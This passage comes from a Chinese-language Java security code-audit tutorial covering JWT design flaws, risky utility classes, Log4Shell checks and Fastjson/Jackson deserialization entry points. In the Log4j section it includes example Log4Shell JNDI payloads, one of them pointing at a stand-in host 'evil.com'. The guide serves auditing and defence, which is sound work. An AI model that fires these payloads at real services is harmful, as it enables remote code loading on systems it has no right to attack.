  - 用户被封禁后立即失效

👉 一旦 Token 泄露，在有效期内将持续可用

**问题五：缺乏上下文绑定**

Token 中未绑定任何上下文信息，例如：`IP`、`User-Agent`、设备标识等

- 一旦 Token 被窃取，可以在任意环境中复用
- 如果前端将 Token 存储在 Cookie 中，且后端缺乏 CSRF 防护机制，还可能放大 CSRF 攻击风险


另外值得注意的一点是，这些审计和判断，是经验性的，并非绝对性的。这是因为不同的开发者，不同的公司，开发风格不同。

举个例子:
```java
public class JwtUtil {
    /**
     * 生成jwt
     * 使用Hs256算法, 私匙使用固定秘钥
     *
     * @param secretKey jwt秘钥
     * @param ttlMillis jwt过期时间(毫秒)
     * @param claims    设置的信息
     * @return
     */
    public static String createJWT(String secretKey, long ttlMillis, Map<String, Object> claims) {
        // 指定签名的时候使用的签名算法，也就是header那部分
        SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;

        // 生成JWT的时间
        long expMillis = System.currentTimeMillis() + ttlMillis;
        Date exp = new Date(expMillis);

        // 设置jwt的body
        JwtBuilder builder = Jwts.builder()
                // 如果有私有声明，一定要先设置这个自己创建的私有的声明，这个是给builder的claim赋值，一旦写在标准的声明赋值之后，就是覆盖了那些标准的声明的
                .setClaims(claims)
                // 设置签名使用的签名算法和签名使用的秘钥
                .signWith(signatureAlgorithm, secretKey.getBytes(StandardCharsets.UTF_8))
                // 设置过期时间
                .setExpiration(exp);

        return builder.compact();
    }

    /**
     * Token解密
     *
     * @param secretKey jwt秘钥 此秘钥一定要保留好在服务端, 不能暴露出去, 否则sign就可以被伪造, 如果对接多个客户端建议改造成多个
     * @param token     加密后的token
     * @return
     */
    public static Claims parseJWT(String secretKey, String token) {
        // 得到DefaultJwtParser
        Claims claims = Jwts.parser()
                // 设置签名的秘钥
                .setSigningKey(secretKey.getBytes(StandardCharsets.UTF_8))
                // 设置需要解析的jwt
                .parseClaimsJws(token).getBody();
        return claims;
    }

}

```

❓️ 这段代码也和当一段出现了同样多的问题吗？

⭐ 绝大多数是的。但是有两点没有，这个项目之中，
- 一是，可以看见的是密钥没有硬编码
- 二是，是做了不同角色的区分。

❓️ 为什么第二点，这段代码里面没有？

✳️ 因为被开发者放到拦截器里面去了。因此具体的，看有关JWT的设计，我们有时候还需要关注一下拦截器，过滤器，甚至是切面（AOP）。
仅根据一个包，或者一层就下定论，有些时候容易误判。
```java
@Component
@Slf4j
public class JwtTokenAdminInterceptor implements HandlerInterceptor {

    @Autowired
    private JwtProperties jwtProperties;

    /**
     * 校验jwt
     *
     * @param request
     * @param response
     * @param handler
     * @return
     * @throws Exception
     */
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
            throws Exception {
        // 判断当前拦截到的是Controller的方法还是其他资源
        if (!(handler instanceof HandlerMethod)) {
            // 当前拦截到的不是动态方法，直接放行
            return true;
        }

        // 1、从请求头中获取令牌
        String token = request.getHeader(jwtProperties.getAdminTokenName());

        // 2、校验令牌
        try {
            log.info("jwt校验:{}", token);
            Claims claims = JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), token);
            Long empId = Long.valueOf(claims.get(JwtClaimsConstant.EMP_ID).toString());
            BaseContext.setCurrentId(empId);
            // 3、通过，放行
            return true;
        } catch (Exception ex) {
            // 4、不通过，响应401状态码
            response.setStatus(401);
            return false;
        }
    }
}
```

#### 3.5.4 其他常见的工具类

- **加密工具类**  
  一些初学者会将加密相关逻辑直接封装在 utils 中，这一部分需要重点关注算法的选择与使用方式。

  - 是否使用了不安全的哈希算法（如 MD5、SHA1）
  - 是否存在明文存储敏感信息的情况
  - 是否正确使用了加盐（salt）机制

  👉 对于需要持久化存储的敏感信息（如密码），通常建议使用更安全的哈希算法，例如：`bcrypt`、`scrypt`、`argon2` 等

  👉 在条件允许的情况下，可以进一步引入“胡椒（pepper）”机制，提高整体安全性

- **支付工具类**  
  这类工具通常直接涉及资金与核心业务安全，其重要性不言而喻。

  常见需要关注的问题包括：

  - 是否校验支付金额（是否由服务端计算，而非信任前端）
  - 是否验证订单状态（防止重复支付、越权支付）
  - 是否校验回调来源（防止伪造支付回调）

  👉 由于这一部分涉及业务逻辑较多，后续会单独作为一节进行分析

- **HTTP 请求工具类（如调用第三方接口）**  
  一些项目会封装 HTTP 请求工具（如基于 `HttpClient`、`RestTemplate`、`OkHttp`），用于调用外部接口。

  需要关注：

  - 请求 URL 是否可控（可能导致 SSRF）
  - 是否限制访问内网地址（如 127.0.0.1、169.254.169.254 等）
  - 是否存在重定向跟随问题

  👉 如果 URL 来源于用户输入且未做限制，可能形成 SSRF 漏洞

- **验证码 / 随机数工具类**  
  常用于登录、注册、找回密码等场景。

  需要关注：

  - 是否使用安全的随机数生成器（如 `SecureRandom`）
  - 是否存在可预测的验证码（如时间戳、简单递增）
  - 验证码是否有过期时间与次数限制

  👉 弱随机数或无校验机制，可能导致验证码被爆破或预测

- **ID 生成工具类（如雪花算法等）**  
  用于生成订单号、用户ID等。

  需要关注：
  - ID 是否可预测（如自增ID）
  - 是否被直接用于权限判断（如通过ID访问资源）

  👉 如果 ID 可预测，可能导致数据枚举或越权访问

- **日期 / 时间工具类**  
  常用于订单、活动、权限控制等场景。

  需要关注：
  - 是否依赖客户端时间
  - 是否存在时间判断逻辑错误（如过期判断不严格）

  👉 可能影响权限控制或业务逻辑（如提前/延后执行）

- **日志工具类（或日志封装）**  
  一些项目会对日志进行统一封装。

  需要关注：
  - 是否记录敏感信息（如密码、Token）
  - 是否存在日志注入问题（如未过滤用户输入）

  👉 日志往往被忽略，但一旦泄露，影响范围较大


>总体来说，这些工具类的共同特点是：
>**它们本身不一定直接产生漏洞，但会影响系统是否具备某种“可被利用的能力”。**

>对于一些值得细讲的工具类，之后我找到好的样例后，会在这一小节之中进行拓展。也欢迎各位大佬提供一些有趣的样例。 

### 3.6 Controller 层业务审计（用户可访问的接口入口）


### 3.7 一些典型的，值得一提的方向

#### 3.7.1 log4j

谈到 Log4j 漏洞（Log4Shell），一个很容易被误解但**非常关键的点**是：

❗*漏洞存在于 **log4j-core** 中，而不是 log4j-api*

**第一步：看依赖里有没有 `log4j-core` ，在 Maven 项目中，先看依赖树：**
```bash
mvn dependency:tree -Dincludes=log4j
````
重点关注：是否存在 `log4j-core`，以及版本是多少。另外不只是关注开发者自己引入的依赖，还要关注通过依赖链引入的。

版本判断（是否存在漏洞）

| 版本                | 风险       |
| ----------------- | -------- |
| `< 2.15.0`        | 高危（Log4Shell） |
| `2.15.0 ~ 2.16.0` | 仍有问题     |
| `>= 2.17.0`       | 安全       |

👉 因此：只有在 **存在 log4j-core 且版本较低时，风险才真正存在**

✳️ **几个容易误判的地方**
- 只有 log4j-api，不算使用 log4j ，没有漏洞
```text
log4j-api:2.x.x
```
- 出现 log4j-to-slf4j，只是桥接（把 log4j 日志转发到其他框架，比如 logback），也不算真正使用 log4j
```text
log4j-to-slf4j
```

🚩 **如果存在漏洞版本**

当发现，例如：
```text
log4j-core:2.14.1
```
这时候才需要进一步分析漏洞是否会被利用

并不是有漏洞就一定能打（当然即便不能够打，也值得升级依赖，否则后续更新功能依旧可能引入能够打地漏洞），关键看：

> 用户输入是否进入 logger，并且未经过安全处理

🔍 **重点关注点**：用户输入来源是否直接拼接到日志中，例如

* HTTP 请求参数（query / body）
* Header（User-Agent / X-Forwarded-For 等）
* 表单输入
* 文件内容
* 数据库字段（⚠️ 很容易忽略，可能用户输入，先通过HTTP请求参数进入数据库，在后续的查询之中有作为输入进入logger）

危险写法例如：

```java
logger.info("user input: " + userInput);
```
或：
```java
logger.error("error: {}", userInput);
```
👉 如果 `userInput` 可控，就有风险

典型 payload：

```text
${jndi:ldap://xxx.com/a}
```
如果能进入日志系统并被解析，就可能触发远程加载

一个更具体一点的例子
```java
@GetMapping("/test")
public String test(String name) {
    logger.info("user: " + name);
    return "ok";
}
```
如果访问：
```text
/test?name=${jndi:ldap://evil.com/a}
```
在存在漏洞版本的 log4j-core 下，就可能被利用


#### 3.7.2 反序列化漏洞



**第一步：分析“反序列化入口”**

核心思想是：
> ❗ 所有“把字符串 / 字节 → 对象”的地方都要看

🔍 Fastjson 相关入口

✔ 常见方法有
```java
JSON.parseObject(json)
JSON.parseObject(json, Object.class)
JSON.parse(json)
JSON.parseArray(json)
```
一些比较危险的写法比如

❗ ① 通用解析（高风险）：类型不固定，可能触发 autoType / 绕过
```java
Object obj = JSON.parseObject(json, Object.class);
Object obj = JSON.parse(json);
```
⚠️ ② 不明确类型：
```java
JSONArray arr = JSON.parseArray(json);
```
🔎 Jackson 入口

```java
objectMapper.readValue(json, Xxx.class)
```
一些比较危险的写法比如

❗ ① 通用类型
```java
objectMapper.readValue(json, Object.class);
```
❗ ② 多态类型
```java
objectMapper.enableDefaultTyping()
```
开启后：
```java
readValue(json, BaseClass.class)
```
❗ 可能被利用

🔍 原生 Java（高危）入口
```java
ObjectInputStream.readObject()
```
✔ 最经典反序列化漏洞入口

✔ 直接高危


🔍 工具类封装
```java
JsonUtil.parse(json)
```
内部可能写的不安全：
```java
return JSON.parseObject(json);
```
因此必须全局搜索调用链

🔍 JSONReader
```java
JSONReader reader = new JSONReader(...);
reader.readObject();
```
🔍 其他框架还有：
* Hessian
* XStream
* Kryo


**第二步：看“数据来源”**

> 漏洞成立的前提 = 数据可控

一些常见来源：

| 来源              | 风险 |
| --------------- | - |
| HTTP 参数 / Body  |  高 |
| Header / Cookie |  高 |
| WebSocket       |  高 |
| 文件上传            | 高 |
| 数据库 / Redis     | 中 |
| 第三方接口           |  中 |
| 内部常量            | 低 |

📌 一些危险的示例

```java
String json = request.getParameter("data");
JSON.parseObject(json, Object.class);
```

```java
String json = httpClient.doGet(url);
JSON.parseObject(json);
```

如果数据来源于外部，则需要判断是否可控

**第三步：看“解析方式”**

✔ 安全写法：明确类型，不触发 autoType
```java
User user = JSON.parseObject(json, User.class);
```

× 危险写法：通用反序列化

```java
Object obj = JSON.parseObject(json, Object.class);
```

**第四步：看配置（Fastjson / Jackson）**

⚠️ **Fastjson**高危配置：
```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```
```java
JSON.parseObject(json, Object.class, Feature.SupportAutoType);
```
宽松白名单
```java
ParserConfig.getGlobalInstance().addAccept("com.xxx.");
```

⚠️ **Jackson**高危配置：
```java
objectMapper.enableDefaultTyping();
```
或：
```java
objectMapper.activateDefaultTyping(...)
```
**第五步：关注依赖版本**

📌 Fastjson

| 版本       | 风险   |
| -------- | ---- |
| < 1.2.83 | 存在绕过 |
| ≥ 1.2.83 | ✔ 安全 |

📌 Jackson

* 关注 databind 历史漏洞
* 重点不是版本，而是配置（DefaultTyping）


**第六步：看是否存在 Gadget（利用链）**

常见依赖有：
* commons-collections
* commons-beanutils
* groovy
* spring-core
* JdbcRowSetImpl（JDK）
